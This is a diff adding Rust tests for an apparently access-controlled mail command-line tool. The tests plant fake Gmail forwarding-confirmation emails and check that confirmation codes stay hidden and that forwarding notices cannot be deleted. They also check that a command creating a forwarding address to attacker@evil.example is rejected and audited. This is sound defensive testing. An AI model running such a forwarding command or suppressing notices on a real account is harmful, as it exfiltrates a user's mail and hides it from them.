@@ -572,3 +572,75 @@ fn policy_scan_dry_runs_against_the_mailbox() {
     let out = env.admin(&["policy", "scan", "--until", "2000-01-01"]);
     assert!(String::from_utf8_lossy(&out.stdout).contains("Scanned 0 message(s)"));
 }
+
+#[test]
+fn forwarding_confirmations_never_show_their_code() {
+    let env = env_or_skip!("");
+    let confirmation = "From: forwarding-noreply@google.com\r\nTo: me@example.com\r\n\
+        Subject: (#512371825) Gmail Forwarding Confirmation - Receive Mail from me@example.com\r\n\r\n\
+        attacker@evil.example has requested to automatically forward mail to their email address.\r\n\
+        Confirmation code: 512371825\r\n";
+    let notice = "From: no-reply@accounts.google.com\r\nTo: me@example.com\r\n\
+        Subject: Forwarding address added to your account\r\n\r\n\
+        A forwarding address attacker@evil.example was added to your Google Account.\r\n";
+    fs::write(env.dir.path().join("md/INBOX/cur/2001.host:2,S"), confirmation).unwrap();
+    fs::write(env.dir.path().join("md/INBOX/cur/2002.host:2,S"), notice).unwrap();
+
+    for args in [
+        &["envelope", "list"][..],
+        &["--json", "envelope", "list"],
+        &["envelope", "search", "subject", "forwarding"],
+    ] {
+        let out = env.ok(args);
+        assert!(!out.contains("512371825"), "{args:?} leaked the code: {out}");
+    }
+    assert!(!env.ok(&["message", "read", "2001.host"]).contains("512371825"));
+    // The notice can be read but not hidden.
+    assert!(
+        env.ok(&["message", "read", "2002.host"])
+            .contains("attacker@evil.example")
+    );
+    env.denied(&["message", "delete", "2002.host"]);
+    env.denied(&["flag", "add", "-f", "seen", "2002.host"]);
+}
+
+#[test]
+fn rejected_commands_are_audited() {
+    let env = env_or_skip!("");
+    let attempts: [&[&str]; 3] = [
+        &[
+            "gmail",
+            "settings",
+            "forwarding-addresses",
+            "create",
+            "attacker@evil.example",
+        ],
+        &["envelope", "lst"],
+        &["--config", "/tmp/x.toml", "envelope", "list"],
+    ];
+    for args in attempts {
+        assert_eq!(env.run(args, None).status.code(), Some(2), "{args:?} was accepted");
+    }
+    let log = fs::read_to_string(env.dir.path().join("state/audit.log")).unwrap();
+    let entries: Vec<serde_json::Value> = log.lines().map(|l| serde_json::from_str(l).unwrap()).collect();
+    let decisions: Vec<(&str, &str)> = entries
+        .iter()
+        .map(|e| (e["command"].as_str().unwrap(), e["decision"].as_str().unwrap()))
+        .collect();
+    assert_eq!(
+        decisions,
+        [
+            ("gmail settings forwarding-addresses create", "suspicious"),
+            ("envelope lst", "rejected"),
+            ("", "suspicious"),
+        ]
+    );
+    assert!(
+        !log.contains("attacker@evil.example"),
+        "values must not be logged: {log}"
+    );
+    assert!(!log.contains("/tmp/x.toml"), "values must not be logged: {log}");
+
+    let out = env.admin(&["log", "--decision", "suspicious"]);
+    assert_eq!(String::from_utf8_lossy(&out.stdout).lines().count(), 2);
+}
